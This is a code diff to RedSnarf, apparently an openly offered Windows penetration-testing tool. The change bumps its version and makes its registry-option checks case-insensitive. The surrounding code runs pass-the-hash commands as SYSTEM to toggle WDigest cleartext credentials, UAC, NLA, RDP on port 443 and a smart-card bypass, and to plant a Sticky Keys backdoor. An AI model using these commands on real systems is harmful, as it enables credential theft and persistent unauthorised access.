@@ -1679,7 +1679,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3p", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3q", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1737,17 +1737,17 @@ egroup.add_argument("-eS", "--screenshot", dest="screenshot", default="n", help=
 egroup.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
 # Registry related
 rgroup = p.add_argument_group('Registry related')
-rgroup.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery AutoLogon Registry Setting")
-rgroup.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting")
-rgroup.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Smart Card scforceoption Registry Setting")
+rgroup.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (e)nable/(d)isable/(q)uery AutoLogon Registry Setting")
+rgroup.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Backdoor Registry Setting")
+rgroup.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Smart Card scforceoption Registry Setting")
 rgroup.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
 rgroup.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
-rgroup.add_argument("-rN", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery NLA Status")
-rgroup.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
+rgroup.add_argument("-rN", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (e)nable/(d)isable/(q)uery NLA Status")
+rgroup.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (e)nable/(d)isable/(q)uery RDP Status")
 rgroup.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery allowtgtsessionkey Registry Setting")
-rgroup.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
-rgroup.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery UAC Registry Setting")
-rgroup.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
+rgroup.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Tunnel RDP out of port 443")
+rgroup.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (e)nable/(d)isable/(q)uery UAC Registry Setting")
+rgroup.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Wdigest UseLogonCredential Registry Setting")
 
 args = p.parse_args()
 
@@ -2474,7 +2474,7 @@ if password_policy in yesanswers:
 if edq_scforceoption!='n':
 	if len(targets)==1:
 		try:
-			if edq_scforceoption=='e':
+			if edq_scforceoption.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling SCforceoption:",'green')
@@ -2503,7 +2503,7 @@ if edq_scforceoption!='n':
 				
 				sys.exit()	
 
-			elif edq_scforceoption=='d':
+			elif edq_scforceoption.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')
 								
 				print colored("[+]Disabling SCforceoption:",'green')
@@ -2534,7 +2534,7 @@ if edq_scforceoption!='n':
 
 				sys.exit()	
 	
-			elif edq_scforceoption=='q':
+			elif edq_scforceoption.upper()=='Q':
 				print colored("\n[+]INFO - Disabling this setting can be used to bypass Smart Card Logon\n\n",'red')
 				print colored("[+]Querying the status of SCforceoption:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
@@ -2553,7 +2553,7 @@ if edq_scforceoption!='n':
 if edq_SingleSessionPerUser!='n':
 	if len(targets)==1:
 		try:
-			if edq_SingleSessionPerUser=='e':
+			if edq_SingleSessionPerUser.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling SingleSessionPerUser:",'green')
@@ -2566,7 +2566,7 @@ if edq_SingleSessionPerUser!='n':
 				
 				sys.exit()	
 
-			elif edq_SingleSessionPerUser=='d':
+			elif edq_SingleSessionPerUser.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling SingleSessionPerUser:",'green')
@@ -2579,7 +2579,7 @@ if edq_SingleSessionPerUser!='n':
 
 				sys.exit()	
 	
-			elif edq_SingleSessionPerUser=='q':
+			elif edq_SingleSessionPerUser.upper()=='Q':
 				print colored("[+]Querying the status of SingleSessionPerUser:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
@@ -2597,7 +2597,7 @@ if edq_SingleSessionPerUser!='n':
 if edq_allowtgtsessionkey!='n':
 	if len(targets)==1:
 		try:
-			if edq_allowtgtsessionkey=='e':
+			if edq_allowtgtsessionkey.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling allowtgtsessionkey:",'green')
@@ -2610,7 +2610,7 @@ if edq_allowtgtsessionkey!='n':
 				
 				sys.exit()	
 
-			elif edq_allowtgtsessionkey=='d':
+			elif edq_allowtgtsessionkey.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling allowtgtsessionkey:",'green')
@@ -2623,7 +2623,7 @@ if edq_allowtgtsessionkey!='n':
 
 				sys.exit()	
 	
-			elif edq_allowtgtsessionkey=='q':
+			elif edq_allowtgtsessionkey.upper()=='Q':
 				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
@@ -2641,7 +2641,7 @@ if edq_allowtgtsessionkey!='n':
 if edq_autologon!='n':
 	if len(targets)==1:
 		try:
-			if edq_autologon=='e':
+			if edq_autologon.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling AutoLogon:",'green')
@@ -2654,7 +2654,7 @@ if edq_autologon!='n':
 				
 				sys.exit()	
 
-			elif edq_autologon=='d':
+			elif edq_autologon.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling AutoLogon:",'green')
@@ -2667,7 +2667,7 @@ if edq_autologon!='n':
 
 				sys.exit()	
 	
-			elif edq_autologon=='q':
+			elif edq_autologon.upper()=='Q':
 				print colored("[+]Querying the status of AutoLogon:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
@@ -2697,7 +2697,7 @@ if edq_autologon!='n':
 if edq_wdigest!='n':
 	if len(targets)==1:
 		try:
-			if edq_wdigest=='e':
+			if edq_wdigest.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling Wdigest:",'green')
@@ -2710,7 +2710,7 @@ if edq_wdigest!='n':
 				
 				sys.exit()	
 
-			elif edq_wdigest=='d':
+			elif edq_wdigest.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling Wdigest:",'green')
@@ -2738,7 +2738,7 @@ if edq_wdigest!='n':
 
 				sys.exit()	
 	
-			elif edq_wdigest=='q':
+			elif edq_wdigest.upper()=='Q':
 				print colored("[+]Querying the status of Wdigest:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
@@ -2756,7 +2756,7 @@ if edq_wdigest!='n':
 if edq_nla!='n':
 	if len(targets)==1:
 		try:
-			if edq_nla=='e':
+			if edq_nla.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling NLA:",'green')
@@ -2767,7 +2767,7 @@ if edq_nla!='n':
 
 				sys.exit()	
 
-			elif edq_nla=='d':
+			elif edq_nla.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling NLA:",'green')
@@ -2778,7 +2778,7 @@ if edq_nla!='n':
 
 				sys.exit()	
 	
-			elif edq_nla=='q':
+			elif edq_nla.upper()=='Q':
 				print colored("[+]Querying the status of NLA:",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
 
@@ -2796,7 +2796,7 @@ if edq_nla!='n':
 if edq_trdp!='n':
 	if len(targets)==1:
 		try:
-			if edq_trdp=='e':
+			if edq_trdp.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Setting RDP port to 443:",'green')
@@ -2811,7 +2811,7 @@ if edq_trdp!='n':
 
 				sys.exit()	
 
-			elif edq_trdp=='d':
+			elif edq_trdp.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Setting RDP to default port of 3389:",'green')
@@ -2826,7 +2826,7 @@ if edq_trdp!='n':
 
 				sys.exit()	
 	
-			elif edq_trdp=='q':
+			elif edq_trdp.upper()=='Q':
 				print colored("[+]Querying the status of RDP Port:",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
 
@@ -2843,7 +2843,7 @@ if edq_trdp!='n':
 if edq_rdp!='n':
 	if len(targets)==1:
 		try:
-			if edq_rdp=='e':
+			if edq_rdp.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling RDP:",'green')
@@ -2861,7 +2861,7 @@ if edq_rdp!='n':
 
 				sys.exit()	
 
-			elif edq_rdp=='d':
+			elif edq_rdp.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Disabling RDP:",'green')
@@ -2878,7 +2878,7 @@ if edq_rdp!='n':
 
 				sys.exit()	
 	
-			elif edq_rdp=='q':
+			elif edq_rdp.upper()=='Q':
 				print colored("[+]Querying the status of RDP:",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
 
@@ -2895,7 +2895,7 @@ if edq_rdp!='n':
 if edq_backdoor!='n':
 	if len(targets)==1:
 		try:
-			if edq_backdoor=='e':
+			if edq_backdoor.upper()=='E':
 				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n",'red')
 
 				print colored("[+]BACKDOOR 1: Sticky Keys - Activate by pressing left shift multiple times at a Locked workstation to stard cmd.exe",'green')
@@ -2922,7 +2922,7 @@ if edq_backdoor!='n':
 				
 				sys.exit()
 
-			elif edq_backdoor=='d':
+			elif edq_backdoor.upper()=='D':
 				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n",'red')
 
 				print colored("[+]BACKDOOR 1: Sticky Keys",'green')
@@ -2941,7 +2941,7 @@ if edq_backdoor!='n':
 				
 				sys.exit()
 	
-			elif edq_backdoor=='q':
+			elif edq_backdoor.upper()=='Q':
 				print colored("[+]Querying the status of Backdoors:",'green')
 
 				print colored("[+]BACKDOOR 1: Sticky Keys Status",'green')
@@ -2963,7 +2963,7 @@ if edq_backdoor!='n':
 if edq_uac!='n':
 	if len(targets)==1:
 		try:
-			if edq_uac=='e':
+			if edq_uac.upper()=='E':
 				print colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling UAC:",'green')
@@ -2972,7 +2972,7 @@ if edq_uac!='n':
 
 				sys.exit()	
 
-			elif edq_uac=='d':
+			elif edq_uac.upper()=='D':
 				print colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red')
 
 				print colored("[+]Disabling UAC:",'green')
@@ -2981,7 +2981,7 @@ if edq_uac!='n':
 
 				sys.exit()	
 	
-			elif edq_uac=='q':
+			elif edq_uac.upper()=='Q':
 				print colored("[+]Querying the status of UAC:",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" ' 2>/dev/null")
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" ' 2>/dev/null")
